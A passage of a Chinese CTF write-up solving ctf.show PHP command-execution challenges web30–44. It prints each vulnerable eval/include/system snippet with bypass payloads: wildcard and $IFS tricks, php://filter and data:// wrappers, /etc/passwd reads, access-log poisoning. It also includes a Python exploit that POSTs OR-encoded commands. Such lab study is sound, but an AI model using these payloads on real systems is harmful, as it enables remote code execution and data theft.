class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用passthru</span><br><span class="line">/?c=passthru(&#x27;tac fla*&#x27;);</span><br><span class="line">*被过滤了，如果可以ls看到文件名，可以用?</span><br><span class="line">/?c=passthru(&#x27;tac fla?????&#x27;);</span><br><span class="line"></span><br><span class="line">反字节符配合echo</span><br><span class="line">/?c=echo(`tac fla*`);</span><br><span class="line"></span><br><span class="line">带参数输入</span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&quot;.&quot;</span><br><span class="line">pos():输出数组第一个元素，不改变指针；</span><br><span class="line">scandir();遍历目录，这里因为参数为&quot;.&quot;所以遍历当前目录</span><br><span class="line">array_reverse():元组倒置</span><br><span class="line">next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</span><br><span class="line">show_source():查看源码</span><br><span class="line"></span><br><span class="line">用%09代替空格，%09是在php环境下才能使用</span><br><span class="line">/?c=passthru(&quot;tac%09fla*&quot;);</span><br><span class="line"></span><br><span class="line">$IFS$9绕过空格，注意转义$符号 </span><br><span class="line">/?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">/?c=include%09$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include%0a$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include%0a$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">在User-Agent中写入&lt;?php system(&quot;cat flag.php&quot;)?&gt;在访问日志</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">/?c=include%0A$_POST[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用伪协议<code>data</code>绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain, &lt;?php system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p>each() 返回数组中当前的键&#x2F;值对并将数组指针向前移动一步<br>end() 将数组的内部指针指向最后一个单元<br>next() 将数组中的内部指针向前移动一位<br>prev() 将数组中的内部指针倒回一位<br>array_reverse() 以相反的元素顺序返回数组</p></blockquote><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>留下了<code>|</code>运算符，参考<a href="https://blog.csdn.net/miuzzx/article/details/108569080">yu师傅</a>和<a href="https://www.wlhhlc.top/posts/14827/#web41">dota_st</a>的脚本简单写了下exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">OPAND = <span class="number">0</span></span><br><span class="line">OPOR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Files = [<span class="string">&#x27;rce_cmd_and.txt&#x27;</span>, <span class="string">&#x27;rce_cmd_or.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RceCmdGen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, opcode, pattern</span>):</span><br><span class="line">        self._opcode = opcode</span><br><span class="line">        self.pattern = pattern</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._opcode</span><br><span class="line"></span><br><span class="line"><span class="meta">    @opcode.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> opcode&gt;=<span class="number">0</span> <span class="keyword">and</span> opcode&lt;=<span class="number">1</span>:</span><br><span class="line">            self._opcode = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;range(2) need&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_rce_or_gen</span>(<span class="params">self</span>):</span><br><span class="line">        content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (re.match(self.pattern, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.match(self.pattern, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">                    k = i|j</span><br><span class="line">                    <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                        param_1 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                        param_2 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                        content += <span class="string">&#x27;&#123;&#125; &#123;&#125; &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(k), param_1, param_2)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_cmd_or.txt&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rce_gen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(self.pattern, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> self._opcode == <span class="number">1</span>:</span><br><span class="line">                self._rce_or_gen()</span><br><span class="line">            <span class="keyword">elif</span> self._opcode == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;To be continued...\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Opcode Error&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;&quot;str&quot; type need&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;exit: input exit in function or command&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_argv</span>():</span><br><span class="line">    <span class="keyword">if</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg, opcode</span>):</span><br><span class="line">    _param_1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    _param_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(Files[opcode], mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = f.readline()</span><br><span class="line">                <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> line[<span class="number">0</span>] == i:</span><br><span class="line">                    _param_1 += line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    _param_2 += line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="comment"># print(_param_1)</span></span><br><span class="line">                    <span class="comment"># print(_param_2)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    _res = <span class="string">&#x27;(&quot;&#123;&#125;&quot;|&quot;&#123;&#125;&quot;)&#x27;</span>.<span class="built_in">format</span>(_param_1, _param_2)</span><br><span class="line">    <span class="keyword">return</span> _res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># opcode = int(input(&#x27;[+] Your Opcode: &#x27;))</span></span><br><span class="line">    opcode = <span class="number">1</span></span><br><span class="line">    <span class="comment"># preg = input(&#x27;\n[+] Your Pattern: &#x27;)</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    rce_cmd = RceCmdGen(opcode=opcode, pattern=preg)</span><br><span class="line">    rce_cmd.rce_gen()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        func = <span class="built_in">input</span>(<span class="string">&quot;\n[+] Your Function: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> func == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;\n[+] Your Command: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = action(func, opcode=opcode) + action(cmd, opcode=opcode)</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># response = requests.post(url=url+payload)</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Need Url&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        main(url=url)</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令分隔符即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=cat flag.php;</span><br><span class="line">/?c=cat flag.php||</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>cat</code>和<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac flag.php||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span 